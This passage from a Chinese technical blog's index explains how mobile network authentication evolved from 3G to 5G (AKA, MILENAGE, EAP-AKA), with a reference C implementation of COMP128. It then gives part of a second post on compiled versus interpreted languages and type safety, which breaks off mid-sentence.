title=\"四、3G（UTMS）的鉴权流程\"></a>四、3G（UTMS）的鉴权流程</h2><p>2000年，ITU 制定 3G 空口传输标准制式的时候，针对2G智能卡及网络的破解攻击已经存在。因此，在 3G 网络认证标准制定时，采用了两项关键技术：一是建立“用户+网络”的<strong>双向认证机制</strong>，二是将智能卡升级为USIM卡（Universal Subscriber Identity Module，全球用户识别卡），并选用更加安全的认证算法。</p>\n<blockquote>\n<p>CMCC是个特例！因为政府只给了 TD-SCDMA 牌照，巨大的市场压力下提出“不换号、不换卡”的业务策略，直到 4G 时代才将 SIM 卡换成 USIM 卡。</p>\n</blockquote>\n<h3 id=\"1-五元组认证向量（RAND-XRES-CK-IK-AUTN）\"><a href=\"#1-五元组认证向量（RAND-XRES-CK-IK-AUTN）\" class=\"headerlink\" title=\"1. 五元组认证向量（RAND, XRES, CK, IK, AUTN）\"></a>1. 五元组认证向量（RAND, XRES, CK, IK, AUTN）</h3><p>3G 标准的鉴权流程与 GSM 基本相同，关键是用户认证向量发生变化。</p>\n<p><img src=\"/2023/04/16/%E7%A7%BB%E5%8A%A8%E9%80%9A%E4%BF%A1%E7%BD%91%E7%9A%84%E9%89%B4%E6%9D%83%E8%AE%A4%E8%AF%81%E6%8A%80%E6%9C%AF/3G-1.jpg\" alt=\"1\"></p>\n<ol>\n<li>在第三步中，网络侧发送<code>(RAND，AUTN)</code>。不仅有用于挑战的随机数 RAND，还增加了 AUTN（Authentication Token）参数，使得 USIM 可以鉴别网络的真伪，防止接入伪基站<ul>\n<li>GSM 中的长期密钥Ki，3G 标准改名为 K，GSM AKA 也改为 UMTS AKA</li>\n<li>AUTN 通过终端与归属网络之间的共享密钥K，以及一些其他输入参数计算得出</li>\n</ul>\n</li>\n<li>在第四步中，如果 AUTN 验证通过，USIM 基于长期密钥 K 计算形成<code>(XRES，CK，IK)</code>。<ul>\n<li>XRES：挑战的响应值，第五步将此上报给网络侧，实现网络对用户的认证，</li>\n<li>CK：机密性保护密钥，与GSM的 Kc 对应</li>\n<li>IK：完整性保护密钥，3G 标准新增</li>\n</ul>\n</li>\n</ol>\n<h3 id=\"2-MILENAGE-算法簇\"><a href=\"#2-MILENAGE-算法簇\" class=\"headerlink\" title=\"2. MILENAGE 算法簇\"></a>2. MILENAGE 算法簇</h3><p>3GPP 使用代号为$f1$ - $f5$ 的5个算法来产生认证向量，但允许运营商自行决定采用何种具体算法，因为这些算法应用于 USIM 和 AUC 之间，不涉及到运营商之间的互操作。<br>3GPP 推荐使用基于 AES 的 MILENAGE 算法簇，加密分组和密钥长度都是128比特，</p>\n<p><img src=\"/2023/04/16/%E7%A7%BB%E5%8A%A8%E9%80%9A%E4%BF%A1%E7%BD%91%E7%9A%84%E9%89%B4%E6%9D%83%E8%AE%A4%E8%AF%81%E6%8A%80%E6%9C%AF/network.png\" alt=\"N\"></p>\n<ul>\n<li>SQN：48bit序列号，通过序列号确保每个认证向量不会被重放；</li>\n<li>AK：48bit用于隐藏序列号的临时密钥，基于K和RAND生成；</li>\n<li>MAC：64bit，用于构成AUTN的主要变量，由于包含了K的计算，可用于作为网络认证；</li>\n<li>AMF：Authentication Management Field，共16bit，未标准化。在4G的时候，最高位被用于区分AMF所在的认证向量是4G的认证向量还是3G的认证向量，因为4G和3G可能会共用HSS&#x2F;AuC。</li>\n</ul>\n<p><img src=\"/2023/04/16/%E7%A7%BB%E5%8A%A8%E9%80%9A%E4%BF%A1%E7%BD%91%E7%9A%84%E9%89%B4%E6%9D%83%E8%AE%A4%E8%AF%81%E6%8A%80%E6%9C%AF/usim.png\" alt=\"N\"></p>\n<ul>\n<li>$f1(SQN, AFM, K) \\Rightarrow MAC$</li>\n<li>$f2(K，RAND) \\Rightarrow XRES$</li>\n<li>$f3(K, RAND) \\Rightarrow CK$</li>\n<li>$f4(K, RAND) \\Rightarrow IK$</li>\n<li>$f5(K, RAND) \\Rightarrow AK$</li>\n<li>$AUTN &#x3D; SQN \\oplus AK || MAC || AMF$</li>\n</ul>\n<p>理论上来说，在3G认证过程实施之后就不会再出现伪基站了，但也有一些例外情况，如为了方便2G存量用户的使用，3G网络在推荐使用USIM卡接入的基础上、同时也允许SIM卡直接认证后接入；因此，对于使用SIM卡接入网络的用户还是容易受到2G伪基站的攻击。<br>另外，3G认证协议标准化不久，就发现易受到重定向攻击 (redirection attack) ，2017年的黑帽大会上有针对4G网络攻击案例被披露.</p>\n<h2 id=\"五、4G-的鉴权流程\"><a href=\"#五、4G-的鉴权流程\" class=\"headerlink\" title=\"五、4G 的鉴权流程\"></a>五、4G 的鉴权流程</h2><p>4G 基本沿用了3G认证的协议流程和认证算法，只在卡的兼容性和后续密钥的衍生方面有少量的修改，称为 EPS-AKA，主要改进包括：</p>\n<ol>\n<li>LTE 仅允许 USIM 接入，不允许 SIM 接入，意味着双向认证和信令的完整性保护是必选的。<br>但在少量特殊的情况下，例如终端被叫因为不支持 VoLTE 而被切换到 2G，或者 4G 过载向 2G 进行切换时，可能仍然存在伪基站的问题，2017 年的黑帽大会上就曝出了一个“呼叫劫持”漏洞。</li>\n<li>为了支持 WLAN 的接入方式，提供了扩展的 EAP-AKA 和 EAP-AKA’ 认证。<br>EAP-AKA 是将 AKA 认证过程使用 EAP 协议进行封装，其核心参数仍然是AKA认证向量，参与认证的网元有UE、AC、AAA Server、HSS。<br><img src=\"/2023/04/16/%E7%A7%BB%E5%8A%A8%E9%80%9A%E4%BF%A1%E7%BD%91%E7%9A%84%E9%89%B4%E6%9D%83%E8%AE%A4%E8%AF%81%E6%8A%80%E6%9C%AF/eap.jpg\" alt=\"1\"></li>\n</ol>\n<h2 id=\"六、5G-的鉴权流程\"><a href=\"#六、5G-的鉴权流程\" class=\"headerlink\" title=\"六、5G 的鉴权流程\"></a>六、5G 的鉴权流程</h2><p>5G 继承了 AKA 作为网络接入的认证方式，重点考虑认证体系的扩展，主要改进包括：</p>\n<ol>\n<li>增强了归属网络对认证的控制。<br>5G-AKA 对认证向量进行一次单向变换，拜访地运营商仅能获取漫游用户经过变换之后的认证向量，并将漫游用户反馈的认证结果发送给归属地。<br><img src=\"/2023/04/16/%E7%A7%BB%E5%8A%A8%E9%80%9A%E4%BF%A1%E7%BD%91%E7%9A%84%E9%89%B4%E6%9D%83%E8%AE%A4%E8%AF%81%E6%8A%80%E6%9C%AF/6g.jpg\" alt=\"6\"></li>\n<li>统一的认证框架更好支持 WLAN 等非蜂窝通信网络。<br> 一方面，5G 无线网接入可以采用 EAP-AKA’ 认证方式，EAP-AKA’认证方式提升到了和 5G-AKA 并列的位置；另一方面，EAP-AKA’ 认证和 5G-AKA 认证在网络架构上使用了同样的网元，意味着5G的认证网元在标准上必须同时支持这两种认证方式。</li>\n</ol>\n<h2 id=\"七、-总结\"><a href=\"#七、-总结\" class=\"headerlink\" title=\"七、 总结\"></a>七、 总结</h2><p>通信网络的认证协议，基于“挑战-响应”的AKA协议是一条贯穿始终的线索。但从2G到5G，AKA也一直在演进以适应形势的变化。所谓形势，主要是新的威胁的出现，或一些预期的安全风险逐渐变成现实。毕竟，算力在不断强大，而网络越来越复杂。AKA的演进，在AKA的前缀上表现出来：在2G的时候，AKA就叫AKA；在3G的时候，应对伪基站风险，增加了双向认证，解决了用户对网络的信任问题，3G的AKA被称为UMTS AKA；在4G的时候，Authentication部分没有变化，但Key Agreement发生了变化，针对无线网络、核心网络，衍生出不同的密钥，解决了无线网和核心网的互信问题，4G的AKA被称为EPS AKA；5G的AKA增强了归属网络的控制，解决归属网络和拜访网络的互信问题，并被称为5G AKA。</p>\n<p>相对来说，算法变动倒是相对小些，在2G被证明不安全的COMP128在3G之后就被可以以AES为核心的MILENAGE替代，目前这个部分仍然被认为是安全的。</p>\n<p>在AKA这条主脉络之外，5G作为一个“野心勃勃”的网络，在认证上也体现出与以往几代不同之处，如EAP。在4G的时候可以作为WLAN接入的认证方式，但并非特别重要。在5G中，EAP还承载了为外部数据网络提供认证服务、为垂直行业应用提供认证服务的职能，充分体现了5G希望超越“人与手机”的单一形态，从设计上就契合物联网、工业互联网等形态的需求。</p>\n<hr>\n<h2 id=\"附录一：COMP128-算法实现\"><a href=\"#附录一：COMP128-算法实现\" class=\"headerlink\" title=\"附录一：COMP128 算法实现\"></a>附录一：COMP128 算法实现</h2><p>COMP128 - Details</p>\n<ol>\n<li>x[16-31] &#x3D; RAND</li>\n<li>for 0&lt;i&lt;8<br>  x[0-15] &#x3D; Ki<br>  call Compression (5 rounds)<br>  call FormBitsFromBytes<br>  if i&lt;7 call Permute</li>\n</ol>\n<p>Compress 16-byte result to 12-bytes, store in simoutput[] and return.</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">comp128v1</span><span class=\"params\">(<span class=\"type\">const</span> <span class=\"type\">uint8_t</span> *ki, <span class=\"type\">const</span> <span class=\"type\">uint8_t</span> *rand, <span class=\"type\">uint8_t</span> *sres, <span class=\"type\">uint8_t</span> *kc)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> i;</span><br><span class=\"line\">    <span class=\"type\">uint8_t</span> x[<span class=\"number\">32</span>], bits[<span class=\"number\">128</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* x[16-31] = RAND */</span></span><br><span class=\"line\">    <span class=\"built_in\">memcpy</span>(&amp;x[<span class=\"number\">16</span>], rand, <span class=\"number\">16</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Round 1-7 */</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (i=<span class=\"number\">0</span>; i&lt;<span class=\"number\">7</span>; i++) &#123;</span><br><span class=\"line\">        <span class=\"comment\">/* x[0-15] = Ki */</span></span><br><span class=\"line\">        <span class=\"built_in\">memcpy</span>(x, ki, <span class=\"number\">16</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">/* Compression */</span></span><br><span class=\"line\">        _comp128_compression(x);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">/* FormBitFromBytes */</span></span><br><span class=\"line\">        _comp128_bitsfrombytes(x, bits);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">/* Permutation */</span></span><br><span class=\"line\">        _comp128_permutation(x, bits);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Round 8 (final) */</span></span><br><span class=\"line\">    <span class=\"comment\">/* x[0-15] = Ki */</span></span><br><span class=\"line\">    <span class=\"built_in\">memcpy</span>(x, ki, <span class=\"number\">16</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Compression */</span></span><br><span class=\"line\">    _comp128_compression(x);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Output stage */</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (i=<span class=\"number\">0</span>; i&lt;<span class=\"number\">8</span>; i+=<span class=\"number\">2</span>)</span><br><span class=\"line\">        sres[i&gt;&gt;<span class=\"number\">1</span>] = x[i]&lt;&lt;<span class=\"number\">4</span> | x[i+<span class=\"number\">1</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (i=<span class=\"number\">0</span>; i&lt;<span class=\"number\">12</span>; i+=<span class=\"number\">2</span>)</span><br><span class=\"line\">        kc[i&gt;&gt;<span class=\"number\">1</span>] = (x[i + <span class=\"number\">18</span>] &lt;&lt; <span class=\"number\">6</span>) |</span><br><span class=\"line\">                   (x[i + <span class=\"number\">19</span>] &lt;&lt; <span class=\"number\">2</span>) |</span><br><span class=\"line\">                   (x[i + <span class=\"number\">20</span>] &gt;&gt; <span class=\"number\">2</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    kc[<span class=\"number\">6</span>] = (x[<span class=\"number\">30</span>]&lt;&lt;<span class=\"number\">6</span>) | (x[<span class=\"number\">31</span>]&lt;&lt;<span class=\"number\">2</span>);</span><br><span class=\"line\">    kc[<span class=\"number\">7</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"keyword\">inline</span> <span class=\"type\">void</span> _comp128_compression(<span class=\"type\">uint8_t</span> *x)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> n;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (n=<span class=\"number\">0</span>; n&lt;<span class=\"number\">5</span>; n++)</span><br><span class=\"line\">        _comp128_compression_round(x, n, _comp128_table[n]);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"keyword\">inline</span> <span class=\"type\">void</span> _comp128_bitsfrombytes(<span class=\"type\">uint8_t</span> *x, <span class=\"type\">uint8_t</span> *bits)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> i;</span><br><span class=\"line\">    <span class=\"built_in\">memset</span>(bits, <span class=\"number\">0x00</span>, <span class=\"number\">128</span>);</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (i=<span class=\"number\">0</span>; i&lt;<span class=\"number\">128</span>; i++)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (x[i&gt;&gt;<span class=\"number\">2</span>] &amp; (<span class=\"number\">1</span>&lt;&lt;(<span class=\"number\">3</span>-(i&amp;<span class=\"number\">3</span>))))</span><br><span class=\"line\">            bits[i] = <span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"keyword\">inline</span> <span class=\"type\">void</span> _comp128_permutation(<span class=\"type\">uint8_t</span> *x, <span class=\"type\">uint8_t</span> *bits)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> i;</span><br><span class=\"line\">    <span class=\"built_in\">memset</span>(&amp;x[<span class=\"number\">16</span>], <span class=\"number\">0x00</span>, <span class=\"number\">16</span>);</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (i=<span class=\"number\">0</span>; i&lt;<span class=\"number\">128</span>; i++)</span><br><span class=\"line\">        x[(i&gt;&gt;<span class=\"number\">3</span>)+<span class=\"number\">16</span>] |= bits[(i*<span class=\"number\">17</span>) &amp; <span class=\"number\">127</span>] &lt;&lt; (<span class=\"number\">7</span>-(i&amp;<span class=\"number\">7</span>));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"https://www.secrss.com/articles/36564\">移动通信网中的密码算法演进 (三)：认证篇</a></li>\n<li><a href=\"https://www.secrss.com/articles/36562\">移动通信网中的密码算法演进 (一)：机密性保护</a></li>\n<li><a href=\"https://www.secrss.com/articles/36563\">移动通信网中的密码算法演进 (二)：完整性保护</a></li>\n<li><a href=\"https://github.com/osmocom/libosmocore/blob/master/src/gsm/comp128.c\">COMP128算法源码 - Github</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/528866024\">GSM SIM卡算法COMP128生日攻击原理 - 知乎</a></li>\n<li><a href=\"https://blog.csdn.net/qq_31985307/article/details/115265685\">3GPP USIM milenage 算法代码</a></li>\n</ul>\n<h3 id=\"文档下载\"><a href=\"#文档下载\" class=\"headerlink\" title=\"文档下载\"></a>文档下载</h3><ul>\n<li><a href=\"%E7%A7%BB%E5%8A%A8%E9%80%9A%E4%BF%A1%E7%BD%91%E9%89%B4%E6%9D%83%E8%AE%A4%E8%AF%81%E7%BB%BC%E8%BF%B0_%E8%83%A1%E9%91%AB%E9%91%AB.pdf\">移动通信网鉴权认证综述 - 胡鑫鑫</a></li>\n<li><a href=\"chinois.pdf\">COMP128算法分析中关键问题研究 - 汪涛</a></li>\n<li><a href=\"comp128-a-birthday-surprise-rev.pdf\">COMP128: A Birthday Surprise - Stuart Wray</a></li>\n</ul>\n"},{"title":"编译型语言和解释型语言的基本原理","url":"/2021/10/31/%E7%BC%96%E8%AF%91%E5%9E%8B%E8%AF%AD%E8%A8%80%E5%92%8C%E8%A7%A3%E9%87%8A%E5%9E%8B%E8%AF%AD%E8%A8%80%E7%9A%84%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/","content":"<h2 id=\"汇编语言-Assembly-Language\"><a href=\"#汇编语言-Assembly-Language\" class=\"headerlink\" title=\"汇编语言 - Assembly Language\"></a>汇编语言 - Assembly Language</h2><p>先看Wiki关于编译器的定义。</p>\n<blockquote>\n<p>In computing, a compiler is a computer program that translates computer code written in one programming language (the source language) into another language (the target language). The name “compiler” is primarily used for programs that translate source code from a high-level programming language to a lower level language (e.g. assembly language, object code, or machine code) to create an executable program.</p>\n</blockquote>\n<p>编译器（compiler）是一种计算机程序，它会将某种编程语言写成的源代码（原始语言）转换成另一种编程语言（目标语言）。换句话说，编译器就是一个翻译家，负责将一种语言转换为另一种语言，以便某种计算机系统能够理解并执行。</p>\n<p>对于计算机语言来说，无论是低级语言，还是高级语言，都是基于<strong>汇编语言</strong>（Assembly Language）来构建的。</p>\n<p>汇编语言是任何一种用于电子计算机、微处理器、微控制器，或其他可编程器件的低级语言。在不同的设备中，汇编语言对应着不同的机器语言指令集。一种汇编语言专用于某种计算机系统结构，而不像许多高级语言，可以在不同系统平台之间移植。</p>\n<blockquote>\n<p>目前市场上主流芯片的机器语言指令集包括：X86、ARM、RISC-V、MIPS等四种。<br>而HP的PA-RISC、IBM的PowerPC、DEC的Alpha、SUN的SPARC等指令集已经被淘汰。</p>\n</blockquote>\n<p>CPU机器语言的指令都是二进制的，称为操作码（opcode），比如加法指令就是<code>00000011</code>。对于人类来说，二进制程序是不可读的，根本看不出来机器干了什么。为了解决可读性的问题，以及偶尔的编辑需求，就诞生了汇编语言。<br>汇编语言是二进制指令的文本形式，与指令是一一对应的关系。比如，加法指令<code>00000011</code>写成汇编语言就是<code>ADD</code>。只要还原成二进制，汇编语言就可以被 CPU 直接执行，所以它是最底层的低级语言。</p>\n<img src=\"/2021/10/31/%E7%BC%96%E8%AF%91%E5%9E%8B%E8%AF%AD%E8%A8%80%E5%92%8C%E8%A7%A3%E9%87%8A%E5%9E%8B%E8%AF%AD%E8%A8%80%E7%9A%84%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/hbyy.jpg\" class=\"\">\n\n<p>汇编语言使用助记符（Mnemonics）来代替和表示特定低级机器语言的操作。特定的汇编目标指令集可能会包括特定的操作数。许多汇编程序可以识别代表地址和常量的标签（Label）和符号（Symbols），这样就可以用字符来代表操作数而无需采取写死的方式。普遍地说，每一种特定的汇编语言和其特定的机器语言指令集是一一对应的。<br>许多汇编程序为程序开发、汇编控制、辅助调试提供了额外的支持机制。有的汇编语言编写工具经常会提供宏，它们也被称为宏汇编器。</p>\n<h2 id=\"编译型语言-Compiled-Lanuage\"><a href=\"#编译型语言-Compiled-Lanuage\" class=\"headerlink\" title=\"编译型语言 - Compiled Lanuage\"></a>编译型语言 - Compiled Lanuage</h2><p>编译语言是一种高级编程语言类型，首先通过编译器（Compiler）将代码编译为机器代码，然后再加以运行。<br>在此过程中，编译器一次将整个程序转换为机器代码。如果有任何语法或语义错误，编译器将给出错误警告并退出，如果不纠正这些错误，就不可能执行程序。</p>\n<p><code>C</code>、<code>C++</code>、<code>Object C</code>都是典型的编译语言为例，而<code>gcc</code>、<code>Clang</code>等就是其编译器。</p>\n<blockquote>\n<p><code>GCC</code>（GNU Compiler Collection）是一套完整的开源编译器软件，包括编译器前端和后端，不仅支持<code>C</code>和<code>C++</code>，还可以支持<code>Java</code>、<code>Ada</code>和<code>Fortran</code>等多种语言。<br>Apple原来也采用<code>GCC</code>，但由于认为对其支持不力，而自行开发了<code>Clang</code>，并宣称编译速度有显著提高。<br>注意，<code>Clang</code>只是一个编译器前端，通常使用<code>LLVM</code>(Low Level Virtual Machine)作为编译器后端，<code>LLVM</code>利用虚拟技术使编译时期、链接时期、运行时期和闲置时期达到最优化，广泛支持多种语言的编译和优化。如果你准备开发自己的编译器，这是一个非常重要的基础组件。</p>\n</blockquote>\n<img src=\"/2021/10/31/%E7%BC%96%E8%AF%91%E5%9E%8B%E8%AF%AD%E8%A8%80%E5%92%8C%E8%A7%A3%E9%87%8A%E5%9E%8B%E8%AF%AD%E8%A8%80%E7%9A%84%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/code.png\" class=\"\">\n\n<p>以<code>cpp</code>语言开发为例，使用gcc生成可执行文件需要经历四个相互关联的步骤∶</p>\n<ul>\n<li>预处理(也称预编译，Preprocessing)：调用<code>cpp</code>进行预处理，对源代码文件(后缀一般为<code>.cpp</code>)中的文件包含(include)、预编译语句(如宏定义define等)进行分析</li>\n<li>编译(Compilation)：调用<code>cc1</code>进行编译，根据输入文件生成以<code>.o</code>为后缀的目标文件</li>\n<li>汇编(Assembly)：调用<code>as</code>进行工作，一般来讲，.S为后缀的汇编语言源代码文件和汇编、.s为后缀的汇编语言文件,经过预编译和汇编之后都生成以.o为后缀的目标文件</li>\n<li>连接(Linking)：在连接阶段，所有的目标文件被安排在可执行程序中的恰当的位置，同时，该程序所调用到的库函数也从各自所在的档案库中连到合适的地方</li>\n</ul>\n<img src=\"/2021/10/31/%E7%BC%96%E8%AF%91%E5%9E%8B%E8%AF%AD%E8%A8%80%E5%92%8C%E8%A7%A3%E9%87%8A%E5%9E%8B%E8%AF%AD%E8%A8%80%E7%9A%84%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/gcc.png\" class=\"\">\n\n<p>在Linux中，cpp代码编译中常见的文件名后缀包括：</p>\n<ul>\n<li><code>.i</code>是对源代码进行预处理后的中间文件，主要工作包括：处理宏定义、预编译指令、删除注释、添加行号和文件标识等</li>\n<li><code>.o</code>是编译中间目标文件，相当于win上的<code>.obj</code></li>\n<li><code>.a</code>是静态库文件，由多个<code>.o</code>文件链接得到，用于静态链接</li>\n<li><code>.so</code>是共享库文件，用于动态链接（shared object），相当于win上<code>.dll</code></li>\n</ul>\n<h2 id=\"解释型语言-Interpreted-language\"><a href=\"#解释型语言-Interpreted-language\" class=\"headerlink\" title=\"解释型语言 - Interpreted language\"></a>解释型语言 - Interpreted language</h2><p>解释语言（Interpreted language）是一种编程语言类型，会将代码一句一句直接运行，需要哪些源代码就转换哪些源代码，不会生成可执行程序，这种编程语言称为解释语言（Interpreted language），使用的转换工具称为解释器。</p>\n<p>解释器就像一位“中间人”，一边解释一边执行，因此依赖于解释器的程序运行速度比较缓慢。<br>解释器的好处是它不需要重新编译整个程序，从而减轻了每次程序更新后编译的负担。</p>\n<p>常见的解释语言的示例是<code>Basic</code>、<code>PHP</code>，<code>Ruby</code>，<code>Python</code>和<code>JavaScript</code>。</p>\n<p>以Basic为例，其代码和运行结果示例：</p>\n<figure class=\"highlight basic\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"symbol\">10 </span><span class=\"keyword\">INPUT</span> <span class=\"string\">&quot;What is your name: &quot;</span>, U$</span><br><span class=\"line\"><span class=\"symbol\">20 </span><span class=\"keyword\">PRINT</span> <span class=\"string\">&quot;Hello &quot;</span>; U$</span><br><span class=\"line\"><span class=\"symbol\">30 </span><span class=\"keyword\">INPUT</span> <span class=\"string\">&quot;How many stars do you want: &quot;</span>, N</span><br><span class=\"line\"><span class=\"symbol\">40 </span>S$ = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\"><span class=\"symbol\">50 </span><span class=\"keyword\">FOR</span> I = <span class=\"number\">1</span> <span class=\"keyword\">TO</span> N</span><br><span class=\"line\"><span class=\"symbol\">60 </span>S$ = S$ + <span class=\"string\">&quot;*&quot;</span></span><br><span class=\"line\"><span class=\"symbol\">70 </span><span class=\"keyword\">NEXT</span> I</span><br><span class=\"line\"><span class=\"symbol\">80 </span><span class=\"keyword\">PRINT</span> S$</span><br><span class=\"line\"><span class=\"symbol\">90 </span><span class=\"keyword\">INPUT</span> <span class=\"string\">&quot;Do you want more stars? &quot;</span>, A$</span><br><span class=\"line\"><span class=\"symbol\">100 </span><span class=\"keyword\">IF</span> <span class=\"keyword\">LEN</span>(A$) = <span class=\"number\">0</span> <span class=\"keyword\">THEN</span> <span class=\"keyword\">GOTO</span> <span class=\"number\">90</span></span><br><span class=\"line\"><span class=\"symbol\">110 </span>A$ = <span class=\"keyword\">LEFT$</span>(A$, <span class=\"number\">1</span>)</span><br><span class=\"line\"><span class=\"symbol\">120 </span><span class=\"keyword\">IF</span> A$ = <span class=\"string\">&quot;Y&quot;</span> <span class=\"keyword\">OR</span> A$ = <span class=\"string\">&quot;y&quot;</span> <span class=\"keyword\">THEN</span> <span class=\"keyword\">GOTO</span> <span class=\"number\">30</span></span><br><span class=\"line\"><span class=\"symbol\">130 </span><span class=\"keyword\">PRINT</span> <span class=\"string\">&quot;Goodbye &quot;</span>; U$</span><br><span class=\"line\"><span class=\"symbol\">140 </span><span class=\"keyword\">END</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"关于类型安全（Type-Safety）的讨论\"><a href=\"#关于类型安全（Type-Safety）的讨论\" class=\"headerlink\" title=\"关于类型安全（Type Safety）的讨论\"></a>关于类型安全（Type Safety）的讨论</h2><p>尼古拉斯·沃斯的一个著名的公式：<code>程序 = 数据结构 + 算法</code>。<br>其中，数据是可以被记录或存储的信息，数据结构则说的是一种组织或存储数据的方式，而算法则是通过对输入的处理从而输出能解决问题的有效方法。<br>也就是说，任何一种编程语言，都需要为变量、常量、函数（方法）提供并定义数据类型（Type），本质就是提供一块内存的存储区域。</p>\n<p>类型错误（type error）是错误或不期望的程序行为，由不同数据类型的差别所引起，如把整型（int）当作了浮点型（float），由此可能引发数据越界而造成安全漏洞。<br>以C语言的指针类型为例，由于其类型定义不严格，非常容易引发数组溢出、堆栈溢出、缓冲区溢出、野指针（<code>void *p</code>）等安全问题，最终将指向内存的某个不可知区域造成系统崩溃或安全漏洞。</p>\n<p>为了解决类型安全问题，从不同的角度产生了多种方案，以下是几个较为常见的维度：</p>\n<h3 id=\"动态语言-Vs-静态语言\"><a href=\"#动态语言-Vs-静态语言\" class=\"headerlink\" title=\"动态语言 Vs 静态语言\"></a>动态语言 Vs 静态语言</h3><ul>\n<li><p>动态语言（Dynamic programming language）：是一类在运行时可以改变对象结构的语言：例如新的函数、对象、甚至代码可以被引进，已有的函数可以被删除或是其他结构上的变化。通俗点说就是在运行时代码可以根据某些条件改变自身结构。<br>主要动态语言：Object-C、JavaScript、PHP、Python、Erlang。</p>\n</li>\n<li><p>静态语言（Statically programming language）：与动态语言相对应的，运行时对象结构不可变的语言就是静态语言。如Java、C、C++、C#。</p>\n</li>\n</ul>\n<blockquote>\n<p>动态语言的常见特征有：eval函数、对象运行时修改属性或方法、反射和宏。<br>大部分动态语言都使用动态类型，但也有些不是。</p>\n</blockquote>\n<h3 id=\"强类型语言-Vs-弱类型语言\"><a href=\"#强类型语言-Vs-弱类型语言\" class=\"headerlink\" title=\"强类型语言 Vs 弱类型语言\"></a>强类型语言 Vs 弱类型语言</h3><ul>\n<li><p>强类型语言（Strong typing language）：即没有强制类型转化前，不允许两种不同类型的变量相互操作。<br>强类型语言包括：Java、.net、Python、C++等语言。其中Python是动态语言，是强类型定义语言，是类型安全的语言，Java是静态语言，是强类型定义语言，也是类型安全的语言。</p>\n</li>\n<li><p>弱类型语言（Weak typing language）：即变量定义时可以忽略数据类型，且该变量可以根据环境变化自动进行隐式类型转换，比如直接将整型变量与字符变量相加。<br>  弱类型语言包括：VB，PHP，JavaScript等语言。其中VBScript是动态语言，是一种类型不安全的原因。</p>\n</li>\n</ul>\n<p>强类型语言和弱类型原因其判断的根本是：<strong>是否会隐形进行语言类型转变</strong>。</p>\n<blockquote>\n<p>使用弱类型语言可节省很多代码量，有更高的开发效率。而对于构建大型项目，使用强类型语言可能会比使用弱类型更加规范可靠。</p>\n</blockquote>\n<h3 id=\"动态类型语言-Vs-静态类型语言\"><a href=\"#动态类型语言-Vs-静态类型语言\" class=\"headerlink\" title=\"动态类型语言 Vs 静态类型语言\"></a>动态类型语言 Vs 静态类型语言</h3><p>类型安全可以静态方式实施，及早在编译阶段（Compiling）就捕捉到潜藏的错误；或者以动态方式，推迟到运行时期（Runtime）检测即将发生的错误。</p>\n<ul>\n<li>动态类型语言（Dynamically Typed Language）：是指在运行期间才去做数据类型检查的语言。<br>在用动态语言编程时，不用给变量指定数据类型，该语言会在你第一次赋值给变量时，在内部将数据类型记录下来。Python和Ruby就是一种典型的动态类型语言；</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>a = <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span><span class=\"built_in\">type</span>(a)</span><br><span class=\"line\">&lt;<span class=\"built_in\">type</span> <span class=\"string\">&#x27;int&#x27;</span>&gt;</span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>a = <span class=\"string\">&quot;s&quot;</span></span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span><span class=\"built_in\">type</span>(a)</span><br><span class=\"line\">&lt;<span class=\"built_in\">type</span> <span class=\"string\">&#x27;str&#x27;</span>&gt;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>静态类型语言（Statically Typed 